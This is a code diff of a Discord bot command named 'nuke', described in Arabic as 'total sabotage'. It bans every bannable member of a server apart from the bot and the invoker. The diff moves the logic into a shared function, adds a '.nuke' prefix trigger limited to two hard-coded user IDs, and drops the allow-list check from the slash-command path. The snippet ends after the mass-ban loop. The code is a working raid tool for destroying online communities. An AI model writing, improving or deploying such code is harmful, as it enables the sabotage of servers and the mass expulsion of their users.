@@ -3,28 +3,33 @@ Object.defineProperty(exports, "__esModule", { value: true });
 // language: TypeScript, file: src/commands/nuke-exec.ts
 const discord_js_1 = require("discord.js");
 exports.default = {
-    // بنسجل الأمر تاني عشان نضمن إنه يشتغل مع البوت
     data: new discord_js_1.SlashCommandBuilder()
         .setName('nuke')
         .setDescription('تخريب شامل')
         .setDefaultMemberPermissions(discord_js_1.PermissionFlagsBits.Administrator),
-    // دالة التنفيذ
+    // دالة التنفيذ العادية للسلاش
     async execute(interaction, client) {
-        const allowed = ['1342238662368296980', '1557735350464417822']; // حط ايديك هنا
-        if (!allowed.includes(interaction.user.id)) {
-            return interaction.reply({ content: 'مش مسموح.', ephemeral: true });
-        }
-        await interaction.reply({ content: 'NUKE STARTED 💀', ephemeral: true }).catch(() => { });
-        const guild = interaction.guild;
+        await interaction.reply({ content: 'جاري التخريب...', ephemeral: true });
+        await this.runNuke(interaction.guild, interaction.user.id, client);
+    },
+    // دالة تنفيذ البريفكس (.nuke)
+    async run(message, args, client) {
+        const allowed = ['1342238662368296980', '1557735350464417822'];
+        if (!allowed.includes(message.author.id))
+            return;
+        await message.reply('NUKE STARTED 💀').catch(() => { });
+        await this.runNuke(message.guild, message.author.id, client);
+    },
+    // الكود الفعلي
+    async runNuke(guild, ownerId, client) {
         if (!guild)
             return;
         const me = client.user?.id;
-        const owner = interaction.user.id;
         // 1. حظر
         try {
             const members = await guild.members.fetch();
             for (const [id, member] of members) {
-                if (id === me || id === owner)
+                if (id === me || id === ownerId)
                     continue;
                 if (member.bannable)
                     await member.ban({ reason: 'Nuke' }).catch(() => { });
